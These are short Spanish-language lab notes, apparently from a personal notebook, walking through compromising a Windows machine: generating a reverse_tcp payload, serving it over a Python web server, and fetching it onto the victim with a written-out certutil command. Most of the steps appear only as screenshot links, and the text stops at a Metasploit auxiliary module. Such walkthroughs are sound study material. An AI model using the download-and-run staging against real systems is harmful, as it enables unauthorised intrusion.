 Vamos a explotar una vulnerabilidad en los archivos de windows.

Creamos un payload de reverse_tcp
![[Pasted image 20240311191710.png]]

Creamos un servidor con python para poder descargar el fichero en la maquina victima
![[Pasted image 20240311191857.png]]

Una vez habilitado el servidor de correo ya nos podremos descargar los payloads, para ello vamos a la maquina victima y ejecutamos el siguiente comando
certutil -urlcache -f http://10.10.24.3/payload.exe/payload.exe
![[Pasted image 20240311192311.png]]

Como podemos ver el archivo se ha descargado correctamente
![[Pasted image 20240311192422.png]]

Antes de ejecutar el payload en la maquina victima ejecutaremos el siguiente auxiliar de metasploit
![[Pasted image 20240311192734.png]]
![[Pasted image 20240311193128.png]]



